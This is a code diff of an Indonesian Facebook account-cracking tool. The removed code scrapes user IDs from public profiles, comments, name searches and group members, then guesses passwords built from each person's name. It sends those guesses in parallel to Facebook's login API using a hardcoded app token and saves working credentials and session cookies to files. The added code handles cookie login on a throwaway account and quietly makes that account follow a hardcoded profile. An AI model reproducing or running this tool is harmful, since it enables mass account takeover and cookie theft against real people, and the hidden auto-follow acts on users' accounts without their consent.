-			return uid
-		except:
-			pass
+    ''' CLEAR TERMINAL '''
+    def clear_terminal(self, platform):
+         if "win" in sys.platform:os.system("cls")
+         else:os.system("clear")
+    
+    ''' ANIMASI EPEPE '''
+    def anim(self):
+       self.anims = [
+           'ikuti aku.','maju kezona aman..','tetap bersabar...','maju maju maju....','tolong aku.....','musuh terlihat......'
+       ]
+       for ___n___ in self.anims:
+           console.print(f"\r {P2}[{H2}+{P2}] {___n___}",end="\r")
+           sleep(0.8)
 
-	###----------[ DUMP ID PUBLIK ]---------- ###
-	def Dump_Publik(self,url):
-		try:
-			url = parser(ses.get(url,cookies=self.cookie).text,"html.parser")
-			for z in url.find_all("a",href=True):
-				if "fref" in z.get("href"):
-					if "/profile.php?id=" in z.get("href"):uid = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",z.get("href")));nama = z.text
-					else:uid = "".join(bs4.re.findall("/(.*?)\?",z.get("href")));nama = z.text
-					if uid+"<=>"+nama in tampung:pass
-					else:tampung.append(uid+"<=>"+nama)
-					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
-			for x in url.find_all("a",href=True):
-				if "Lihat Teman Lain" in x.text:
-					self.Dump_Publik("https://mbasic.facebook.com/"+x.get("href"))
-		except:pass
-		
-	###----------[ DUMP KOMENTAR ]---------- ###
-	def Dump_Komentar(self,url):
-		try:
-			data = parser(ses.get(url).text,"html.parser")
-			for isi in data.find_all("h3"):
-				for ids in isi.find_all("a",href=True):
-					if "profile.php" in ids.get("href"):uid = ids.get("href").split('=')[1].replace("&refid","")
-					else:uid = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
-					nama = ids.text
-					if uid+"<=>"+nama in tampung:pass
-					else:tampung.append(uid+"<=>"+nama)
-					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
-			for z in data.find_all("a",href=True):
-				if "Lihat komentar sebelumnya…" in z.text:
-					self.Dump_Komentar("https://mbasic.facebook.com"+z["href"])
-		except:pass
-		
-	###----------[ DUMP PENCARIAN NAMA ]---------- ###
-	def Dump_Pencarian(self,url):
-		try:
-			data = parser(ses.get(str(url)).text,'html.parser')
-			for z in data.find_all("td"):
-				namp = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(z))
-				for uid,nama in namp:
-					if "profile.php?" in uid:uid = re.findall("id=(.*)",str(uid))[0]
-					elif "<span" in nama:nama = re.findall("(.*?)\<",str(nama))[0]
-					if uid+"<=>"+nama in tampung:pass
-					else:tampung.append(uid+"<=>"+nama)
-					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
-			for x in data.find_all("a",href=True):
-				if "Lihat Hasil Selanjutnya" in x.text:
-					self.Dump_Pencarian(x.get("href"))
-		except:pass
-		
-	###----------[ DUMP MEMBER GRUP ]---------- ###
-	def Dump_MemberGrup(self,url):
-		try:
-			data = parser(ses.get(url,cookies=self.cookie,headers={"user-agent": "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"}).text, "html.parser")
-			judul = re.findall("<title>(.*?)</title>",str(data))[0]
-			for isi in data.find_all("h3"):
-				for ids in isi.find_all("a",href=True):
-					if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");nama = ids.text
-					else:
-						if ids.text==judul:pass
-						else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
-					if uid+"<=>"+nama in tampung:pass
-					else:tampung.append(uid+"<=>"+nama)
-					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
-			for x in data.find_all("a",href=True):
-				if "Lihat Postingan Lainnya" in x.text:
-					self.Dump_MemberGrup("https://mbasic.facebook.com"+x.get("href"))
-		except:pass
-		
-	###----------[ DUMP FILE ]---------- ###
-	def Dump_File(self,lok):
-		try:
-			file = open(lok,"r").read().splitlines()
-			for z in file:
-				tampung.append(z)
-		except:pass
-		
-	###----------[ DUMP EMAIL ]---------- ###
-	def Dump_Email(self,nama,format,limit):
-		try:
-			for z in range(int(limit)):
-				if len(nama.split()) > 1:
-					email = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(format)+"<=>"+str(nama.split()[0])+" "+str(nama.split()[1])
-				else:
-					email = str(nama)+str(z)+str(format)+"<=>"+str(nama)
-				if email in tampung:pass
-				else:tampung.append(email)
-		except:pass
-		
-	###----------[ DUMP USERNAME ]---------- ###
-	def Dump_Username(self,nama,limit):
-		try:
-			for z in range(int(limit)):
-				if "." in nama:
-					user = str(nama)+"."+str(z)+"<=>"+str(nama.replace("."," "))
-				else:
-					user = str(nama)+"."+str(z)+"<=>"+str(nama)
-				if user in tampung:pass
-				else:tampung.append(user)
-		except:pass
+    ''' LOGO KONTOL '''
+    def __tahubulat__(self):
+         try:
+              __Araaaku__ = []
+              __Araaaku__.append(Panel(f'{M2}● {K2}● {H2}●',width=11,padding=(0,2),style=f"bold white"))
+              __Araaaku__.append(Panel(f'{O2}{self.ip} {P2}| {H2}{self.negara}',title="IP NEGARA",width=46,padding=(0,8),style=f"bold white"))
+              __Araaaku__.append(Panel(f'{H2}● {K2}● {M2}●',width=11,padding=(0,2),style=f"bold white"))
+              console.print(Columns(__Araaaku__))
+         except:pass
 
-###----------[ BAGIAN CRACK ]---------- ###
-class Crack:
-	
-	###----------[ FUNCTION INIT ]---------- ###
-	def __init__(self):
-		self.loop = 0
-		self.ok = []
-		self.cp = []
-		self.apk = []
-		self.aktif = []
-		self.kadaluwarsa = []
-		self.hari_ini = datetime.now().strftime("%d-%B-%Y")
-		
-	###----------[ ATUR SANDI DAN METODE ]---------- ###
-	def atursandi(self):
-		prints(Panel(f"""{P2}berhasil mengumpulkan {len(tampung)} id""",width=80,padding=(0,21),style=f"{color_panel}"))
-		set = console.input(f" {H2}• {P2}apakah kamu ingin menggunakan sandi manual?(y/n) : ")
-		
-		###----------[ SANDI MANUAL ]---------- ###
-		if set in["Y","y"]:
-			prints(Panel(f"""{P2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""",width=80,style=f"{color_panel}"))
-			pwx = console.input(f" {H2}• {P2}buat katasandi : ").split(",")
-			if len(pwx)<=5:
-				prints(Panel(f"""{M2}katasandi harus minimal 6 huruf""",width=80,style=f"{color_panel}"))
-				exit()
-			prints(Panel(f"""{P2}memunculkan aplikasi bisa membuat akun terkena checkpoint/dinonaktifkan""",width=80,style=f"{color_panel}"))
-			app = console.input(f" {H2}• {P2}apakah kamu ingin memunculkan aplikasi terkait?(y/n) : ")
-			if app in["Y","y"]:
-				self.apk.append("muncul")
-			else:
-				self.apk.append("kontol anjing")
-			self.manual(pwx)
-		
-		###----------[ SANDI OTOMATIS ]---------- ###
-		else:
-			prints(Panel(f"""{P2}memunculkan aplikasi bisa membuat akun terkena checkpoint/dinonaktifkan""",width=80,style=f"{color_panel}"))
-			app = console.input(f" {H2}• {P2}apakah kamu ingin memunculkan aplikasi terkait?(y/n) : ")
-			if app in["Y","y"]:
-				self.apk.append("muncul")
-			else:
-				self.apk.append("kontol anjing")
-			self.otomatis()
-		
-	###----------[ CRACK MANUAL ]---------- ###
-	def manual(self,pw):
-		global prog,des
-		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
-		des = prog.add_task('',total=len(tampung))
-		with prog:
-			with ThreadPoolExecutor(max_workers=30) as fall:
-				self.simpan_hasil()
-				for data in tampung:
-					user = data.split("<=>")[0]
-					nama = data.split("<=>")[1]
-					pwx = pw
-					fall.submit(self.metode_api,user,pwx)
-		prints(Panel(f"""{P2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
-		sys.exit()
-						
-	###----------[ CRACK OTOMATIS ]---------- ###
-	def otomatis(self):
-		global prog,des
-		prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
-		des = prog.add_task('',total=len(tampung))
-		with prog:
-			with ThreadPoolExecutor(max_workers=30) as fall:
-				self.simpan_hasil()
-				for data in tampung:
-					try:
-						pwx = []
-						user = data.split("<=>")[0]
-						nama = data.split("<=>")[1]
-						depan = nama.split(" ")[0]
-						if len(nama)<=5:
-							if len(depan)<3:
-								pass 
-							else:
-								pwx.append(depan+"123")
-								pwx.append(depan+" 1234") 
-								pwx.append(depan+"12345")
-						else:
-							if len(depan)<3:
-								pwx.append(nama)
-							else:
-								pwx.append(nama)
-								pwx.append(depan+"123")
-								pwx.append(depan+" 1234") 
-								pwx.append(depan+"12345")
-							belakang = nama.split(" ")[1]
-							if len(belakang)<3:
-								pwx.append(depan+belakang)
-							else:
-								pwx.append(depan+belakang)
-								pwx.append(belakang+"123")
-								pwx.append(belakang+" 1234") 
-								pwx.append(belakang+"12345")
-						fall.submit(self.metode_api,user,pwx)
-					except:
-						fall.submit(self.metode_api,user,pwx)
-		prints(Panel(f"""{P2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
-		sys.exit()
-							
-	###----------[ METODE API ]---------- ###
-	def metode_api(self,email,pwx):
-		prog.update(des,description=f" {H2}•{P2} crack {H2}aman{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
-		prog.advance(des)
-		try:
-			for pw in pwx:
-				pw = pw.lower()
-				ua = random.choice(ugent)
-				params = {
-					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
-					"sdk_version": f"{str(random.randint(1,26))}", 
-					"email": email,
-					"locale": "en_US",
-					"password": pw,
-					"sdk": "android",
-					"generate_session_cookies": "1",
-					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
-				}
-				headers = {
-					"Host": "graph.facebook.com",
-					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
-					"x-fb-sim-hni": str(random.randint(20000, 40000)),
-					"x-fb-net-hni": str(random.randint(20000, 40000)),
-					"x-fb-connection-quality": "EXCELLENT",
-					"user-agent": ua,
-					"content-type": "application/x-www-form-urlencoded",
-					"x-fb-http-engine": "Liger"
-				}
-				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
-				if "session_key" in post.text and "EAA" in post.text:
-					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
-					sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-					cookie = f"sb={sb};{coki}"
-					user = re.findall("c_user=(\d+)",cookie)[0]
-					if user in self.ok or user in self.cp:
-						break
-					else:
-						self.ok.append(user)
-						if "muncul" in self.apk:
-							self.get_apk(user,pw,cookie)
-						else:
-							tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
-							tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
-							prints(tree)
-						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{cookie}\n")
-						break
-				elif "User must verify their account" in post.text:
-					user = post.json()["error"]["error_data"]["uid"]
-					if user in self.ok or user in self.cp:
-						break
-					else:
-						self.cp.append(user)
-						tree = Tree(Panel.fit(f"""{K2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
-						tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
-						prints(tree)
-						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
-						break
-				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
-					prog.update(des,description=f" {H2}•{P2} crack {M2}spam{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
-					prog.advance(des)
-					time.sleep(30)
-				else:continue
-		except ConnectionError:
-			time.sleep(30)
-			self.metode_api(user,pwx)
-		self.loop +=1
+    ''' LOGO MEMEK'''
+    def logoo(self):
+        self.__tahubulat__();Console(width=70).print(Panel(f'''{H2}██████  ██ ████████ ██   ██ ██   ██ 
+██   ██ ██    ██    ██   ██ ██  ██     {H2}* {P2}Dit4K {H2}Brute 
+██   ██ ██    ██    ███████ █████      {H2}* {P2}Github {H2}XyraaCode 
+██   ██ ██    ██         ██ ██  ██     {H2}* {P2}Insta {H2}@nazrii_
+██████  ██    ██         ██ ██   ██ ''',title="SELAMAT DATANG",style=f"bold white",padding=(0,5)))
 
-	###----------[ PRINT SIMPAN HASIL ]---------- ###
-	def simpan_hasil(self):
-		prints(Panel(f"""\r{P2}hasil crack ok tersimpan ke : OK/{self.hari_ini}.txt
-{P2}hasil crack ok tersimpan ke : CP/{self.hari_ini}.txt""",width=80,padding=(0,10),style=f"{color_panel}"))
-	
-	###----------[ PRINT MUNCUL APK ]---------- ###
-	def get_apk(self,user,pw,cookie):
-		
-		###----------[ CEK MODE GRATIS ]---------- ###
-		try:
-			url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
-			if "Apa yang Anda pikirkan sekarang" in url:
-				pass
-			else:
-				for z in url.find_all("a",href=True):
-					if "Tidak, Terima Kasih" in z.text:
-						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": cookie})
-						parsing = parser(get.text,"html.parser")
-						action = parsing.find("form",{"method":"post"})["action"]
-						data = {
-							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
-							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
-							"submit": "OK, Gunakan Data"
-						}
-						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": cookie})
-						break
-		except:pass
-			
-		###----------[ APLIKASI AKTIF ]---------- ###
-		aktip = Tree("Aplikasi Aktif",guide_style="bold grey100")
-		self.apkaktif("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookie)
-		if len(self.aktif)==0:
-			aktip.add(f"{P2}tidak ada aplikasi yang terkait")
-		else:
-			for apk in self.aktif:
-				aktip.add(f"{H2}{apk}{P2}")
-				
-		###----------[ APLIKASI KADALUWARSA ]---------- ###
-		kadalu = Tree("Aplikasi Kadaluwarsa",guide_style="bold grey100")
-		self.apkkadaluwarsa("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookie)
-		if len(self.kadaluwarsa)==0:
-			kadalu.add(f"{P2}tidak ada aplikasi yang terkait")
-###----------[ BAGIAN LOGIN ]---------- ###
-class Login:
-	
-	###----------[ FUNCTION INIT ]---------- ###
-	def __init__(self):
-		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
-		self.negara = ses.get("http://ip-api.com/json/").json()["country"]
+    ''' LOGIN '''
+    def ___login___(self):
+        self.clear_terminal(platform);self.logoo()
+        Console(width=70).print(Panel(f'''{P2}masukan cookie facebook anda, wajib menggunakan akun tumbal''',title="LOGIN MENGGUNAKAN COOKIE",style=f"bold white",padding=(0,4)))
+        try:
+            cok = console.input(f' {P2}[{H2}?{P2}] masukan cookie facebook : ')
+            if cok =='' or cok =='':
+              Console(width=70).print(Panel(f'{P2}jangan kosong harap masukan cookie facebook anda',style=f"bold white",padding=(0,9)))
+              sleep(3);self.___login___()
+            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies={"cookie": cok}).text
+            if 'href="/zero/optin/write/' in str(link):
+                Console(width=70).print(Panel(f'{P2}akun facebook anda sedang menggunakan mode free',style=f"bold white",padding=(0,9)))
+                Console(width=70).print(Panel(f'{P2}mohon tunggu sebentar system sedang mengubah cookie ke mode data',style=f"bold white",padding=(0,2)))
+                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
+                gett = self.ses.get(f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": cok}).text
+                poss = par(gett, "html.parser").find("form",{"method":"post"})["action"].replace("amp;", "")
+                date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
+                self.ses.post(f"{self.url}{poss}", data = date, cookies = {"cookie": cok}).text
+                self.__UbahNgaranKontol__({"cookie": cok})
+                console.print(f' {P2}[{H2}✓{P2}] proses mengubah ke mode data telah selesai.\n {P2}[{H2}+{P2}] silahkan masukan ulang cookie nya dengan mengetik python run.py')
+                sleep(3);sys.exit()
+            elif 'href="/x/checkpoint/' in str(link):
+                console.print(f' {P2}[{M2}!{P2}] opshh cookie anda chekcpoint')
+                sleep(3);self.___login___()
+            elif 'href="/r.php' in str(link):
+                console.print(f' {P2}[{M2}!{P2}] cookie yang anda masukan invalid')
+                sleep(3);self.___login___()
+            else:
+                self.anim()
+                self.__UbahNgaranKontol__({"cookie": cok})
+                nama = re.findall("\<title\>(.*?)<\/title\>", link)[0]
+                user = re.search("c_user=(\d+)", str(cok)).group(1)
+                open('data/cookie.json', 'w').write(cok);open('data/token.json', 'w').write(f"{nama}|{user}")
+                console.print(f' {P2}[{H2}+{P2}] selamat datang {H2}{nama} {P2}mohon gunakan tools dengan bijak');self.ikuti({"cookie": cok});self.datas(nama, cok)
+                sleep(5);self.menu()
+        except requests.ConnectionError as e:
+            Console(width=70).print(Panel(f'''{M2}{str(e).title()}''',style=f"bold white",padding=(0,4)))
+            sleep(3);sys.exit()
 
-	###----------[ MENU LOGIN ]---------- ###
-	def menu_login(self):
-		Logo().logonya()
-		prints(Panel(f"{P2}{self.ip}",padding=(0,30),subtitle=f"{H2}{self.negara}",style=f"{color_panel}"))
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. login menggunakan cookie facebook
-[{color_text}02{P2}]. login menggunakan kredensial""",width=80,padding=(0,15),style=f"{color_panel}"))
-		login = console.input(f" {H2}• {P2}pilih menu : ")
-		if login in["1","01"]:
-			prints(Panel(f"""{P2}silahkan masukan cookiemu disini dan pastikan autentikasi tidak aktif""",width=80,style=f"{color_panel}"))
-			cookie = console.input(f" {H2}• {P2}masukan cookie : ")
-			#open("data/cookie","w").write(cookie)
-			self.login_cookie(cookie)
-		else:
-			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
-			
-	###----------[ LOGIN COOKIE ]---------- ###
-	def login_cookie(self,cookie):
-		try:
-			url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
-			if "Apa yang Anda pikirkan sekarang" in url:
-				pass
-			else:
-				for z in url.find_all("a",href=True):
-					if "Tidak, Terima Kasih" in z.text:
-						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": cookie})
-						parsing = parser(get.text,"html.parser")
-						action = parsing.find("form",{"method":"post"})["action"]
-						data = {
-							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
-							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
-							"submit": "OK, Gunakan Data"
-						}
-						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": cookie})
-						break
-			open("data/cookie","w").write(cookie)
-			Menu().menu()
-		except:
-			prints(Panel(f"""{M2}cookie invalid, silahkan gunakan cookie lain yang masih baru atau fresh""",width=80,style=f"{color_panel}"))
-			sys.exit()
-		
-	###----------[ UBAH BAHASA ]---------- ###
-	def ubah_bahasa(self,cookie):
-		try:
-			url = ses.get("https://mbasic.facebook.com/language/",cookies={"cookie": cookie})
-			parsing = parser(url.text,"html.parser")
-			for x in parsing.find_all("form",{"method":"post"}):
-				if "Bahasa Indonesia" in str(x):
-					data = {
-						"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),
-						"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),
-						"submit"  : "Bahasa Indonesia"
-					}
-					post = ses.post("https://mbasic.facebook.com"+x["action"],data=data,cookies={"cookie": cookie})
-		except:
-			pass
-		
-###----------[ BAGIAN MENU ]---------- ###
-class Menu:
-	
-	###----------[ FUNCTION INIT ]---------- ###
-	def __init__(self):
-		self.men = []
-		self.id = []
-		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
-		self.negara = ses.get("http://ip-api.com/json/").json()["country"]
+    ''' UBAH BAHASA '''
+    def __UbahNgaranKontol__(self, cok):
+        try:
+            link = self.ses.get(f"{self.url}/language/", cookies=cok).text
+            data = par(link, "html.parser")
+            for x in data.find_all('form',{'method':'post'}):
+                if "Bahasa Indonesia" in str(x):
+                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit"  : "Bahasa Indonesia"}
+                    self.ses.post(f"{self.url}{x['action']}", data = bahasa, cookies=cok)
+        except:pass
 
-	###----------[ CEK INFO LOGIN ]---------- ###
-	def cek_login(self,cookie):
-		try:
-			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=cookie).text
-			nama = re.findall("<title>(.*?)</title>",url)[0]
-			if "Konten Tidak Ditemukan" in nama:
-				try:os.remove("data/cookie")
-				except:pass
-				Login().menu_login()
-			else:
-				return nama
-		except ConnectionError:
-			prints(Panel(f"""{M2}koneksi internet kamu bermasalah, silahkan cek koneksi kamu kembali""",width=80,style=f"{color_panel}"))
-			exit()
-			
-	###----------[ MENU UTAMA ]---------- ###
-	def menu(self):
-		Logo().logonya()
-		
-		###----------[ GET COOKIE DAN DATA ]---------- ###
-		try:
-			cok = open("data/cookie","r").read()
-			cookie = {"cookie": cok}
-			nama = self.cek_login(cookie)
-		except:
-			try:os.remove("data/cookie")
-			except:pass
-			Login().menu_login()
-		
-		###----------[ PANEL BIASA ]---------- ###
-		prints(Panel(f"{P2}{self.ip}",padding=(0,30),title=f"{H2}{nama}",subtitle=f"{H2}{self.negara}",style=f"{color_panel}"))
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. crack dari id publik   [{color_text}05{P2}]. crack dari random username
-[{color_text}02{P2}]. crack dari pengikut    [{color_text}06{P2}]. crack dari pencarian nama
-[{color_text}03{P2}]. crack dari komentar    [{color_text}07{P2}]. crack dari member grup
-[{color_text}04{P2}]. crack dari random mail [{color_text}08{P2}]. crack dari file sendiri""",width=80,padding=(0,6),style=f"{color_panel}"))
-		prints(Panel(f"""{P2}ketik {H2}bot{P2} untuk ke menu bot dan ketik {H2}lain{P2} untuk ke menu lain""",width=80,padding=(0,6),style=f"{color_panel}"))
-		menu = console.input(f" {H2}• {P2}pilih menu : ")
-		
-		###----------[ ID PUBLIK ]---------- ###
-		if menu in["1","01"]:
-			prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan id atau username : ")
-			if user in["Me","me"]:
-				user = Dump(cookie).GetUser()
-			Dump(cookie).Dump_Publik(f"https://mbasic.facebook.com/{user}?v=friends")
-			Crack().atursandi()
-			
-		###----------[ KOMENTAR ]---------- ###
-		elif menu in["3","03"]:
-			prints(Panel(f"""{P2}masukan id postingan, pastikan postingan bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan id postingan : ")
-			Dump(cookie).Dump_Komentar(f"https://mbasic.facebook.com/{user}")
-			Crack().atursandi()
-			
-		###----------[ EMAIL ]---------- ###
-		elif menu in["4","04"]:
-			prints(Panel(f"""{P2}masukan nama dan format email gunakan '@' di awal contoh @gmail.com""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan nama : ")
-			format = console.input(f" {H2}• {P2}masukan format : ")
-			limit = console.input(f" {H2}• {P2}masukan limit : ")
-			Dump(cookie).Dump_Email(user,format,limit)
-			Crack().atursandi()
-			
-		###----------[ USERNAME ]---------- ###
-		elif menu in["5","05"]:
-			prints(Panel(f"""{P2}masukan nama dan jika 2 kata bisa gunakan titik '.' sebagai pemisah""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan nama : ")
-			limit = console.input(f" {H2}• {P2}masukan limit : ")
-			Dump(cookie).Dump_Username(user,limit)
-			Crack().atursandi()
-			
-		###----------[ PENCARIAN NAMA ]---------- ###
-		elif menu in["6","06"]:
-			prints(Panel(f"""{P2}kamu bisa menggunakan koma (,) sebagai pemisah jika lebih dari 1 nama""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan nama : ")
-			common = open("asset/nama_indonesia","r").read().splitlines()
-			for idt in user.split(","):
-				self.id.append(idt)
-				for people in common:
-					self.id.append(people+" "+idt)
-			try:
-				for gas in self.id:
-					Dump(cookie).Dump_Pencarian(f"https://mbasic.facebook.com/public/{gas}")
-			except:pass
-			Crack().atursandi()
-		
-		###----------[ MEMBER GRUP ]---------- ###
-		elif menu in["7","07"]:
-			prints(Panel(f"""{P2}masukan id grup, pastikan grup bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan id grup : ")
-			Dump(cookie).Dump_MemberGrup(f"https://mbasic.facebook.com/groups/{user}")
-			Crack().atursandi()
-			
-		###----------[ FILE MASSAL ]---------- ###
-		elif menu in["8","08"]:
-			prints(Panel(f"""{P2}masukan tempat file, pastikan izin ke penyimpanan sudah diaktifkan""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan tempat file : ")
-			Dump(cookie).Dump_File(user)
-			Crack().atursandi()
+    ''' APA COBA '''
+    def ikuti(self, cok):
+        try:
+            link = par(self.ses.get(f"{self.url}/profile.php?id=100067687546217", cookies = cok).text, "html.parser")
+            __bokepsd__ = link.find("a", string="Ikuti").get("href")
+            self.ses.get(f"{self.url}{str(__bokepsd__)}", cookies = cok).text
+        except:pass
 
-		###----------[ PINDAH KE MENU BOT ]---------- ###
-		elif menu in["BOT","Bot","bot"]:
-			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
-			
-		###----------[ PINDAH KE MENU LAIN ]---------- ###
-		elif menu in["LAIN","Lain","lain"]:
-			Lain(cookie).menu()
-			
-		else:
-			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
-			
-###----------[ BAGIAN DUMP ]---------- ###
-class Dump:
-	
-	###----------[ FUNCTION INIT ]---------- ###
-	def __init__(self,cookie):
-		self.cookie = cookie
-			
-	###----------[ GET USER SENDIRI ]---------- ###
-	def GetUser(self):
-		try:
-			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=self.cookie).text
-			uid = re.findall('name="target" value="(.*?)"',url)[0]
-			return uid
-		except:
-			pass
+    ''' MENU MAIN MEMEK '''
+    def menu(self):
+        self.clear_terminal(platform);self.logoo()
+        try:
+            cook = {"cookie": open("data/cookie.json", "r").read()}
+            nama, user = open("data/token.json", "r").read().split("|")
+        except FileNotFoundError as e:
+            Console(width=70).print(Panel(f'''{M2}{str(e).title()}''',style=f"bold white",padding=(0,6)))
+            sleep(3);self.___login___()
+        try:
+            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies = cook).text
+            if "mbasic_logout_button" not in link:
+                self.hapus()
+                Console(width=70).print(Panel(f'''{M2}opshh akun tumbal anda terkena chekpoint silahkan login lagi''',style=f"bold white",padding=(0,4)))
+                sleep(3);self.___login___()
+        except requests.ConnectionError as e:
+            Console(width=70).print(Panel(f'''{M2}{str(e).title()}''',style=f"bold white",padding=(0,4)))
+            sleep(3);sys.exit()
+        __Araaaku__ = []
+        __Araaaku__.append(Panel(f'{H2}{nama}',title="TUMBAL",width=35,padding=(0,7),style=f"bold white"))
+        __Araaaku__.append(Panel(f'{H2}{user}',title="USER ID",width=34,padding=(0,8),style=f"bold white"))
+        console.print(Columns(__Araaaku__))
+        Console(width=70).print(Panel(f'''{P2}[{H2}01{P2}]. crack id dari publik    {P2}[{H2}02{P2}]. crack id dari publik massal\n{P2}[{H2}03{P2}]. crack id dari followers {P2}[{H2}04{P2}]. crack id dari member group\n{P2}[{H2}05{P2}]. cek akun {H2}ok{P2}/{K2}cp          {P2}[{H2}06{P2}]. crack id dari file''',title="MENU",style=f"bold white",padding=(0,1)))        
+        Console(width=70).print(Panel(f'''           Ketik {M2}00{P2} Untuk Keluar Atau Ganti Cookie/Tumbal ''',title="Logout",style=f"bold white",padding=(0,1)))
+        __Araaapunyanazri__ = console.input(f' {P2}[{H2}?{P2}] pilih menu (1/2/3) : ')
+        if __Araaapunyanazri__ =='' or __Araaapunyanazri__ =='':
+            Console(width=70).print(Panel(f'''{P2}silahkan pilih menu (1/2/3) dan jangan kosong''',style=f"bold white",padding=(0,9)))
+            sleep(3);self.menu()
+        
+        # ---> Dump Id Publik
+        elif __Araaapunyanazri__ =='1' or __Araaapunyanazri__ =='01':
+            Console(width=70).print(Panel(f'''{P2}anda bisa mengetik {H2}"me" {P2}untuk dump id dari teman sendiri''',title="MASUKAN ID TARGET",style=f"bold white",padding=(0,5)))
+            user = console.input(f' {P2}[{H2}?{P2}] masukan id atau usernama : ')
+            if "me" in user:
+                try:
